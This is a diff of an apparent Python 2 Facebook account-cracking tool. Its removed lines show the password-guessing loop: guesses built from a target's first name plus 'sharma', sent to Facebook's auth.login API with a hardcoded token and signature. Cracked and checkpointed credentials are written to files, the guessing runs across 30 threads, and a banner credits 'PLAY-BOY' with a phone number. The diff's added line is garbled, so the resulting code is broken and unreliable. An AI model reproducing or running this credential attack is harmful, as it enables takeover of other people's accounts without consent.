@@ -419,49 +419,11 @@ def pilih_super():
 															cek = open("out/checkpoint.txt", "a")
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
-															cekpoint.append(user+pass6)
-														else:
-															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-															b = json.loads(a.text)
-															pass7 = (j['first_name']+'sharma')
-															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-															q = json.load(data)
-															if 'access_token' in q:
-																print '\x1b[1;92m☞{Hack}\x1b[1;97m-\x1b[1;94m●\x1b[1;97m-' + user + '-\x1b[1;94m●\x1b[1;97m-' + pass7
-																oks.append(user+pass7)
-															else:
-																if 'www.facebook.com' in q["error_msg"]:
-																	print '\x1b[1;91m☞{CP}\x1b[1;97m-\x1b[1;94m●\x1b[1;97m-' + user + '-\x1b[1;94m●\x1b[1;97m-' + pass7
-																	cek = open("out/checkpoint.txt", "a")
-																	cek.write(user+"|"+pass7+"\n")
-																	cek.close()
-																	cekpoint.append(user+pass7)
-																	
-															
-		except:
-			pass
-		
-	p = ThreadPool(30)
-	p.map(main, id)
-	print "\033[1;95m◥◤◥◤◥◤◥◤◥◤◥◤◥◤•◈•◥◤◥◤◥◤◥◤◥◤◥◤◥◤\033[1;96mPLAY BOY\033[1;95m◥◤◥◤◥◤◥◤◥◤◥◤◥◤•◈•◥◤◥◤◥◤◥◤◥◤◥◤◥◤"
-	print "  \033[1;91m«---•◈•---Developed By PLAY-BOY•◈•---»" #Dev:PLAY_BOY
-	print '\033[1;91mProcess Has Been Completed\033[1;92m....'
-	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
-	print """
-             ▒▒▒███▒███▒███▒███▒▒
-             ▒▒▒▒▒█▒█▒█▒▒▒█▒█▒█▒▒
-             ▒▒▒███▒█▒█▒███▒█▒█▒▒
-             ▒▒▒█▒▒▒█▒█▒█▒▒▒█▒█▒▒
-             ▒▒▒███▒███▒███▒███▒▒
-◥◤◥◤◥◤◥◤◥◤◥◤◥◤•◈•◥◤◥◤◥◤◥◤◥◤◥◤◥◤.
-: \033[1;93m.oldboy  hacker.... \033[1;93m :
-◥◤◥◤◥◤◥◤◥◤◥◤◥◤•◈•◥◤◥◤◥◤◥◤◥◤◥◤◥◤.' 
-                whatsapp Num
-               +8801979526394"""
+															cekpoint.append(ususerer+
 	
-	raw_input("\n\033[1;93m[\033[1;91mplay\033[1;93m]")
-	menu()
+	
+	
  
-if __name__ == '__main__':
-	login()
- 
+
+
+
